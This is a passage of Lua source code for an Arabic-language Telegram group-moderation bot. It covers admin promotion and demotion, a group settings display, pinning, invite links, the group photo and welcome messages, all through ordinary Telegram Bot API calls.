if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم ارفعه مشرف بكل الصلاحيات*'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
else
send(msg.chat_id_, msg.id_, '*⊀︰ لا يوجد حساب بهاذا المعرف*')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("نزل مشرف") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ الايدي >* `'..result.sender_user_id_..'`\n *⊀︰ تم نزله ادمن من الكروب بكل الصلاحيات*'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^نزل مشرف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^نزل مشرف @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'*⊀︰ البوت ليس ادمن يرجى ترقيتي*') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله ادمن من الكروب بكل الصلاحيات*'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '* ⊀︰ لا يوجد حساب بهاذا المعرف*')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
---------------------- بداء كشف المجموعة

----------------------------------------- انتهاء كشف المجموعة
if text == 'اعدادات الكروب' and Mod(msg) then    
if database:get(bot_id..'lockpin'..msg.chat_id_) then    
lock_pin = '√'
else 
lock_pin = '✗'    
end
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then    
lock_tagservr = '√'
else 
lock_tagservr = '✗'    
end
if database:get(bot_id..'lock:text'..msg.chat_id_) then    
lock_text = '√'
else 
lock_text = '✗'    
end
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
lock_add = '√'
else 
lock_add = '✗'    
end    
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
lock_join = '√'
else 
lock_join = '✗'    
end    
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit = '√'
else 
lock_edit = '✗'    
end
print(welcome)
if database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_) then
welcome = '√'
else 
welcome = '✗'    
end
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit_med = '√'
else 
lock_edit_med = '✗'    
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_, "flood") == "kick" then     
flood = 'بالطرد'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "keed" then     
flood = 'بالتقيد'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "mute" then     
flood = 'بالكتم'           
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "del" then     
flood = 'بالمسح'           
else     
flood = '✗'     
end
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
lock_photo = '√' 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = 'بالتقيد'   
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = 'بالكتم'    
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = 'بالطرد'   
else
lock_photo = '✗'   
end    
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
lock_phon = '√' 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = 'بالتقيد'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = 'بالكتم'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = 'بالطرد'    
else
lock_phon = '✗'    
end    
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" then
lock_links = '√'
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" then
lock_links = 'بالتقيد'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" then
lock_links = 'بالكتم'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" then
lock_links = 'بالطرد'    
else
lock_links = '✗'    
end
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = '√'
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = 'بالتقيد'    
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = 'بالكتم'   
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = 'بالطرد'    
else
lock_cmds = '✗'    
end
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" then
lock_user = '√'
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" then
lock_user = 'بالتقيد'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" then
lock_user = 'بالكتم'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" then
lock_user = 'بالطرد'    
else
lock_user = '✗'    
end
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = '√'
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = 'بالتقيد'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = 'بالكتم'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = 'بالطرد'    
else
lock_hash = '✗'    
end
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_muse = '√'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = 'بالتقيد'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = 'بالكتم'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = 'بالطرد'    
else
lock_muse = '✗'    
end 
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
lock_ved = '??'
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = 'بالتقيد'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = 'بالكتم'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = 'بالطرد'    
else
lock_ved = '✗'    
end
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
lock_gif = '√'
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = 'بالتقيد'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = 'بالكتم'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = 'بالطرد'    
else
lock_gif = '✗'    
end
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = '√'
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = 'بالتقيد'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = 'بالكتم'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = 'بالطرد'    
else
lock_ste = '✗'    
end
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
lock_geam = '√'
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = 'بالتقيد'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = 'بالكتم'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = 'بالطرد'    
else
lock_geam = '✗'    
end    
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_vico = '√'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = 'بالتقيد'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = 'بالكتم'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = 'بالطرد'    
else
lock_vico = '✗'    
end    
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = '√'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = 'بالتقيد'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = 'بالكتم'    
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = 'بالطرد'
else
lock_inlin = '✗'
end
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
lock_fwd = '√'
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = 'بالتقيد'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = 'بالكتم'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = 'بالطرد'    
else
lock_fwd = '✗'    
end    
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
lock_file = '√'
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then 
lock_file = 'بالتقيد'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = 'بالكتم'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then 
lock_file = 'بالطرد'    
else
lock_file = '✗'    
end    
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = '√'
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = 'بالتقيد'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = 'بالكتم'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = 'بالطرد'    
else
lock_self = '✗'    
end
if database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'del' then
lock_bots = '√'
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'ked' then
lock_bots = 'بالتقيد'   
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'kick' then
lock_bots = 'بالطرد'    
else
lock_bots = '✗'    
end
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = '√'
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = 'بالتقيد'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = 'بالكتم'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = 'بالطرد'    
else
lock_mark = '✗'    
end
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = '√'
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = 'بالتقيد'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = 'بالكتم'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = 'بالطرد'    
else
lock_spam = '✗'    
end        
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
rdmder = '√'
else
rdmder = '✗'
end
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
rdsudo = '√'
else
rdsudo = '✗'
end
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
idgp = '√'
else
idgp = '✗'
end
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then
idph = '√'
else
idph = '✗'
end
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
setadd = '√'
else
setadd = '✗'
end
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
banm = '√'
else
banm = '✗'
end
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
addme = '√'
else
addme = '✗'
end
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
sehuser = '√'
else
sehuser = '✗'
end
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
kickme = '√'
else
kickme = '✗'
end
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
local text = 
'\n⚙️∫𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂'..
'\n●━━━━𝐑𝐀━━━━●'..
'\n ⊀︰ اعدادات الكروب كتالي √↓'..
'\n●━━━━𝐑𝐀━━━━●'..
'\n ⊀︰ علامة ال {√} تعني مفعل'..
'\n ⊀︰ علامة ال {✗} تعني معطل'..
'\n●━━━━𝐑𝐀━━━━●'..
'\n ⊀︰ الروابط > { '..lock_links..
' }\n'..' ⊀︰ المعرفات > { '..lock_user..
' }\n'..' ⊀︰ التاك > { '..lock_hash..
' }\n'..' ⊀︰ البوتات > { '..lock_bots..
' }\n'..' ⊀︰ التوجيه > { '..lock_fwd..
' }\n'..' ⊀︰ التثبيت > { '..lock_pin..
' }\n'..' ⊀︰ الاشعارات > { '..lock_tagservr..
' }\n'..' ⊀︰ الماركدون > { '..lock_mark..
' }\n'..' ⊀︰ التعديل > { '..lock_edit..
' }\n'..' ⊀︰ تعديل الميديا > { '..lock_edit_med..
' }\n●━━━━𝐑𝐀━━━━●'..
'\n'..' ⊀︰ الكلايش > { '..lock_spam..
' }\n'..' ⊀︰ الكيبورد > { '..lock_inlin..
' }\n'..' ⊀︰ الاغاني > { '..lock_vico..
' }\n'..' ⊀︰ المتحركه > { '..lock_gif..
' }\n'..' ⊀︰ الملفات > { '..lock_file..
' }\n'..' ⊀︰ الدردشه > { '..lock_text..
' }\n'..' ⊀︰ الفيديو > { '..lock_ved..
' }\n'..' ⊀︰ الصور > { '..lock_photo..
' }\n●━━━━𝐑𝐀━━━━●'..
'\n'..' ⊀︰ الصوت > { '..lock_muse..
' }\n'..' ⊀︰ الملصقات > { '..lock_ste..
' }\n'..' ⊀︰ الجهات > { '..lock_phon..
' }\n'..' ⊀︰ الدخول > { '..lock_join..
' }\n'..' ⊀︰ الاضافه > { '..lock_add..
' }\n'..' ⊀︰ السيلفي > { '..lock_self..
' }\n'..' ⊀︰ الالعاب > { '..lock_geam..
' }\n'..' ⊀︰ التكرار > { '..flood..
' }\n'..' ⊀︰ الترحيب > { '..welcome..
' }\n'..' ⊀︰ عدد التكرار > { '..NUM_MSG_MAX..
' }\n●━━━━𝐑𝐀━━━━●'..
'\n ⊀︰ علامة ال {√} تعني مفعل'..
'\n ⊀︰ علامة ال {✗} تعني معطل'..
'\n●━━━━𝐑𝐀━━━━●'..
'\n'..' ⊀︰ امر صيح > { '..kickme..
' }\n'..' ⊀︰ امر اطردني > { '..sehuser..
' }\n'..' ⊀︰ امر منو ضافني > { '..addme..
' }\n'..' ⊀︰ ردود المدير > { '..rdmder..
' }\n'..' ⊀︰ ردود المطور > { '..rdsudo..
' }\n'..' ⊀︰ الايدي > { '..idgp..
' }\n'..' ⊀︰ الايدي بالصوره > { '..idph..
' }\n'..' ⊀︰ الارفع > { '..setadd..
' }\n'..' ⊀︰ الحظر > { '..banm..' }\n\n●━━━━𝐑𝐀━━━━●\n ⊀︰ قناة سورس ريندا ↓\n [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA) \n'
send(msg.chat_id_, msg.id_,text)     
end
if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ⊀︰ عذرآ تم سد التثبيت")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ⊀︰ تم تثبيت الرساله")   
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ⊀︰ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ⊀︰ لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ⊀︰ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil) 
end
if text == 'الغاء التثبيت' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ⊀︰ عذرآ تم سد الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ⊀︰ تم الغاء تثبيت الرساله")   
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ⊀︰ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ⊀︰ لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ⊀︰ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text == 'الغاء تثبيت الكل' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ⊀︰ عذرآ تم سد الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"⊀︰ تم الغاء تثبيت الكل")   
https.request('https://api.telegram.org/bot'..token..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ⊀︰ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ⊀︰ لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ⊀︰ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text and text:match('^ضع تكرار (%d+)$') and Mod(msg) then   
local Num = text:match('ضع تكرار (.*)')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
send(msg.chat_id_, msg.id_,' ⊀︰ تم خلي عدد التكرار ('..Num..')')  
end 
if text and text:match('^ضع زمن التكرار (%d+)$') and Mod(msg) then   
local Num = text:match('^ضع زمن التكرار (%d+)$')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num) 
send(msg.chat_id_, msg.id_,' ⊀︰ تم خلي زمن التكرار ('..Num..')') 
end
if text == "ضع رابط" or text == 'خلي رابط' then
if msg.reply_to_message_id_ == 0  and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_,msg.id_," ⊀︰ حسنآ ارسل اليه الرابط الان")
database:setex(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false
end
end
if text == "تفعيل حذف الردود" then
if Mod(msg) then  
database:del(bot_id.."Rio:Lock:GpRd"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"*⊀︰ تـم تفعيل حذف الردود..🕸️*") 
return false end
end
if text == "تعطيل حذف الردود" then
if Mod(msg) then  
database:set(bot_id.."Rio:Lock:GpRd"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"*⊀︰ تـم تعـطيـل حذف الردود..🕸️*") 
return false  
end
end
if text == "تفعيل اضف رد" then
if Mod(msg) then  
database:del(bot_id.."Rio:Lock:AddRd"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"*⊀︰ تـم تفعيل حذف الردود..🕸️*") 
return false end
end
if text == "تعطيل اضف رد" then
if Mod(msg) then  
database:set(bot_id.."Rio:Lock:AddRd"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"*⊀︰ تـم تعـطيـل حذف الردود..🕸️*") 
return false  
end
end
if text == "تفعيل رابط" or text == 'تفعيل الرابط' then
if Mod(msg) then  
database:set(bot_id.."Link_Group:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"*⊀︰ تـم تفعيل ࢪابـط الڪروب..🕸️*") 
return false  
end
end
if text == "تعطيل رابط" or text == 'تعطيل الرابط' then
if Mod(msg) then  
database:del(bot_id.."Link_Group:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"*⊀︰ تـم تعـطيـل ࢪابـط الڪروب..🕸️*") 
return false end
end
if text == 'المطور' or text == 'مطور' then
tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result)  
local msg_id = msg.id_/2097152/0.5
Text = "*⊀︰ 𝖣𝖾𝗏 𝖭𝖺𝗆𝖤 ↬ * ["..result.first_name_.."](T.me/"..result.username_..")\n*⊀︰ 𝖣𝖾𝗏 𝖴𝖲𝖺𝖱 ↬* [@"..result.username_.."]"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❨ '..result.first_name_..'  ❩ ',url="t.me/"..result.username_}},
}
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
---------------------
if text == "تفعيل صورتي" or text == 'تفعيل الصوره' then
if Constructor(msg) then  
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"* ⊀︰ تم تفعيل الصوره*") 
return false  
end
end
if text == "تعطيل الصوره" or text == 'تعطيل صورتي' then
if Constructor(msg) then  
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"* ⊀︰ تم تعطيل الصوره*") 
return false end
end
if text == "الرابط" then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or database:get(bot_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local Text = '- 𝙇𝙞𝙣𝙠 ↓\n●━━━𝐑𝐀━━━●\n ['..ta.title_..']('..linkgpp.result..')' 
local inline = {{{text = ta.title_, url=linkgpp.result}},
} 
send_inline_key(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5) 
else 
send(msg.chat_id_, msg.id_,'لا يوجد رابط ارسل ` ضع رابط` لعمل رابط') 
end 
end,nil) 
end
if text == 'مسح الرابط' or text == 'حذف الرابط' then
if Mod(msg) then     
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_,msg.id_,"* ⊀︰ تم مسـح الرابـط..🕸️*")           
database:del(bot_id.."Private:Group:Link"..msg.chat_id_) 
return false      
end
end
if text and text:match("^ضع صوره") and Mod(msg) and msg.reply_to_message_id_ == 0 then  
database:set(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_,true) 
send(msg.chat_id_, msg.id_,' ⊀︰ دࢪ࣪ صـوࢪه تـريد اضيفها') 
return false
end
if text == "حذف الصوره" or text == "مسح الصوره" then 
if Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' ⊀︰ تـم وخࢪت صـوره عـمري..🕸️') 
end
return false  
end
if text == 'ضع وصف' or text == 'خلي وصف' then  
if Mod(msg) then
database:setex(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_,' ⊀︰ دࢪ࣪ وصـف عمـري..🕸️')
end
return false  
end
if text == 'ضع ترحيب' or text == 'خلي ترحيب' then  
if Mod(msg) then
database:setex(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
t  = '* ⊀︰ ارسل لي الترحيب الان*'
tt = '\n ⊀︰ تكدر تسـوي ذني بـس دوس تنـسخ !\n ⊀︰ تخـلي اسم شخص يطلع  >{`name`}\n ⊀︰ تـخلي معـرف الشخص يطلع >{`user`}'
send(msg.chat_id_, msg.id_,t..tt) 
end
return false  
end
if text == 'الترحيب' and Mod(msg) then 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
